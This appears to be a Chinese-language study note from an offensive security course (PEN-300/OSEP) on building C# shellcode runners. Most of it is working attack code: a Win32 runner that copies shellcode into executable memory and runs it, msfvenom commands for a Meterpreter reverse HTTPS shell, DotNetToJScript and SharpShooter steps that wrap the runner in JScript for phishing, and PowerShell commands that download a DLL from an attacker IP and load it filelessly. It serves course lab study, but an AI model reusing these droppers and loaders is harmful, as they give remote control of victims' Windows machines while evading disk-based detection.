---
title: OSEP-04-CSharp-ShellcodeRunner
description: '04-JScript攻击 | 08-CSharp-ShellcodeRunner'
pubDate: 2026-01-30T00:00:35+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# C# Shellcode Runner 完整实现

## 概述

使用 C# 调用 Win32 API 实现 Shellcode Runner，可以独立运行或通过 DotNetToJScript 嵌入 JScript。

## Win32 API 导入

### 必需的命名空间

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
```

### API 声明

```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

## 完整控制台应用程序

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... -f csharp
            // 将完整 byte[] 粘贴到这里；不要把省略号放进数组。
            byte[] buf = new byte[] {
                0xfc, 0x48, 0x83, 0xe4, 0xf0
            };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

## DotNetToJScript 版本

### TestClass.cs

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {
        // 将完整 byte[] 粘贴到这里；不要把省略号放进数组。
        byte[] buf = new byte[] {
            0xfc, 0x48, 0x83, 0xe4, 0xf0
        };

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

## 生成 Shellcode

```bash
# 64位（默认 JScript 上下文）
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    EXITFUNC=thread \
    -f csharp

# 32位（如果需要）
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    EXITFUNC=thread \
    -f csharp
```

## Visual Studio 配置

### 设置 x64 平台

1. 打开 Configuration Manager
2. Platform 下拉菜单 → <New...>
3. 选择 x64
4. 确认并关闭

### 编译设置

1. 切换到 Release 模式
2. Build → Build Solution
3. 输出路径：bin\Release\

## 转换为 JScript

```cmd
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```

## SharpShooter 自动化

### 安装

```bash
cd /opt/
sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git
cd SharpShooter/
sudo pip install -r requirements.txt
```

### 生成 Payload

```bash
# 生成原始 shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    -f raw -o /var/www/html/shell.txt

# 使用 SharpShooter 生成 JScript
python SharpShooter.py \
    --payload js \
    --dotnetver 4 \
    --stageless \
    --rawscfile /var/www/html/shell.txt \
    --output test
```

### SharpShooter 参数

| 参数 | 说明 |
|------|------|
| --payload | 输出格式 (js/vbs/hta) |
| --dotnetver | .NET 版本 (2/4) |
| --stageless | 无分阶段 |
| --rawscfile | Shellcode 文件 |
| --output | 输出文件名 |

## 反射加载（PowerShell）

### 从磁盘加载

```powershell
# 下载 DLL
(New-Object System.Net.WebClient).DownloadFile(
    'http://192.168.119.120/ClassLibrary1.dll',
    'C:\Users\Offsec\ClassLibrary1.dll')

# 加载程序集
$assem = [System.Reflection.Assembly]::LoadFile(
    "C:\Users\Offsec\ClassLibrary1.dll")

# 反射调用
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

### 内存加载（无文件）

```powershell
# 下载为字节数组
$data = (New-Object System.Net.WebClient).DownloadData(
    'http://192.168.119.120/ClassLibrary1.dll')

# 从内存加载
$assem = [System.Reflection.Assembly]::Load($data)

# 反射调用
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

### Class Library 代码

```csharp
using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            byte[] buf = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0 };  // 实际使用时替换为完整 shellcode

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

## 注意事项

1. **架构匹配** - Shellcode 必须匹配目标架构
2. **WaitForSingleObject** - 防止进程过早退出
3. **ComVisible** - DotNetToJScript 需要此属性
4. **Release 模式** - 移除调试信息
